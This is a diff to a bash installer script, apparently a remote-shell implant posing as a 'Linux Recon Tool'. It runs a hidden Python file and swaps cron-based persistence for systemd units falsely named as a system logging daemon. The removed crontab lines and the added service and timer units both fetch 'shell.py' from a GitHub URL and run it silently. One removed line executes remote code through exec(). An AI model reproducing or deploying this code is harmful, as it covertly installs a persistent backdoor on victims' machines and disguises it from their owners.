@@ -1,12 +1,6 @@
 #!/bin/bash
 set -e
 
-# Check if cron is running
-if ! systemctl is-active --quiet cron; then
-    sudo systemctl start cron >/dev/null 2>&1 || { echo "[-] Failed to start cron" >&2; exit 1; }
-    sudo systemctl enable cron >/dev/null 2>&1 || { echo "[-] Failed to enable cron" >&2; exit 1; }
-fi
-
 # Check Python3
 if ! command -v python3 >/dev/null 2>&1; then
     echo "[-] Python3 not found" >&2
@@ -33,15 +27,64 @@ fi
 chmod +x ~/.cache/.systemd-conf/.syslogd
 nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &
 
-# Add persistence via crontab (simple, auto-recreate)
-crontab -l > /tmp/cron 2>/dev/null || true
-if ! grep -q ".systemd-conf/.syslogd" /tmp/cron; then
-    echo "PATH=/usr/local/bin:/usr/bin:/bin" >> /tmp/cron
-    echo "@reboot /bin/bash -c 'until ping -c1 192.168.0.139 >/dev/null 2>&1; do sleep 5; done && nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &'" >> /tmp/cron
-    echo "* * * * * [ -f ~/.cache/.systemd-conf/.syslogd ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.cache/.systemd-conf/.syslogd && chmod +x ~/.cache/.systemd-conf/.syslogd && nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &)" >> /tmp/cron
-    echo "* * * * * /bin/bash -c 'until ping -c1 192.168.0.139 >/dev/null 2>&1; do sleep 5; done && nohup python3 -c \"import urllib.request; exec(urllib.request.urlopen(\\\"$shell_url\\\").read().decode())\" >/dev/null 2>&1 &'" >> /tmp/cron
-    crontab /tmp/cron >/dev/null 2>&1 || { echo "[-] Failed to set crontab" >&2; exit 1; }
-fi
-rm -f /tmp/cron >/dev/null 2>&1
+# Create systemd service for persistence
+sudo mkdir -p /etc/systemd/system
+cat << EOF | sudo tee /etc/systemd/system/systemd-syslogd.service >/dev/null
+[Unit]
+Description=System logging daemon
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+ExecStart=/usr/bin/python3 ~/.cache/.systemd-conf/.syslogd
+Restart=always
+RestartSec=5
+User=$(whoami)
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Create systemd service to restore persistence file
+cat << EOF | sudo tee /etc/systemd/system/systemd-syslogd-restore.service >/dev/null
+[Unit]
+Description=System logging daemon restore
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c '[ -f ~/.cache/.systemd-conf/.syslogd ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.cache/.systemd-conf/.syslogd && chmod +x ~/.cache/.systemd-conf/.syslogd)'
+User=$(whoami)
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Create timer to check/restore persistence file every minute
+cat << EOF | sudo tee /etc/systemd/system/systemd-syslogd-restore.timer >/dev/null
+[Unit]
+Description=Timer to restore system logging daemon
+Requires=systemd-syslogd-restore.service
+
+[Timer]
+OnBootSec=60
+OnUnitActiveSec=60
+Unit=systemd-syslogd-restore.service
+
+[Install]
+WantedBy=timers.target
+EOF
+
+# Enable and start services
+sudo systemctl daemon-reload >/dev/null 2>&1
+sudo systemctl enable systemd-syslogd.service >/dev/null 2>&1
+sudo systemctl start systemd-syslogd.service >/dev/null 2>&1
+sudo systemctl enable systemd-syslogd-restore.timer >/dev/null 2>&1
+sudo systemctl start systemd-syslogd-restore.timer >/dev/null 2>&1
 
 echo "[+] Download complete! Use for scanning."
